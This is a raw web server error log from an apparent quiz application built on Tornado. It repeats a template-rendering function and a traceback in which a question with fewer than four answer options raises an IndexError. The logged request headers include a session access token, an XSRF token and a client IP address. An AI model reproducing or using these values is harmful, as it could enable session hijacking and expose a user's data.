 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=50631b088e4c852a6d45fc2a&answers=%5B0%5D&cursor=5&_xsrf=92d20564385d4b7d9c53d2545082ff67', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '92', 'Accept-Language': 'en-us,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.2113257321.1348653567.1348661656.1348671688.3; __utmc=188782963; __utmz=188782963.1348653567.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _xsrf=92d20564385d4b7d9c53d2545082ff67; __utmb=188782963.9.10.1348671688; access_token="QUFBRzZsTmNzNkdjQkFJcTNZeHhEMzVmTTZ2TFJlaWpEVndzR2R5UEZrY3NidVVjd29uRTBWVGRyQlRwQ3pFWkNRbjB6aWRDV3NSa0twQmprNjByT2ZaQ21VcThWOEFQd0hQbElWTTF3WkRaRA==|1348671751|90047c3d9ecf209296a1c87c267835c3dfe44991"; user_type="ZmI=|1348671751|d1e294f0b297ccb9c4a11e7f1cd55167fb7ed56c"', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 213, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 218, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 216.54ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=50631b088e4c852a6d45fc2a&answers=%5B0%5D&cursor=5&_xsrf=92d20564385d4b7d9c53d2545082ff67', headers={'Referer': 'http://www.intheory.co.uk/test/new', 'Content-Length': '92', 'Accept-Language': 'en-us,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Pragma': 'no-cache', 'Cache-Control': 'no-cache', 'X-Real-Ip': '109.158.140.86', 'Cookie': '__utma=188782963.2113257321.1348653567.1348661656.1348671688.3; __utmc=188782963; __utmz=188782963.1348653567.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); _xsrf=92d20564385d4b7d9c53d2545082ff67; __utmb=188782963.9.10.1348671688; access_token="QUFBRzZsTmNzNkdjQkFJcTNZeHhEMzVmTTZ2TFJlaWpEVndzR2R5UEZrY3NidVVjd29uRTBWVGRyQlRwQ3pFWkNRbjB6aWRDV3NSa0twQmprNjByT2ZaQ21VcThWOEFQd0hQbElWTTF3WkRaRA==|1348671751|90047c3d9ecf209296a1c87c267835c3dfe44991"; user_type="ZmI=|1348671751|d1e294f0b297ccb9c4a11e7f1cd55167fb7ed56c"', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 91, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 213, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 218, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 162.12ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
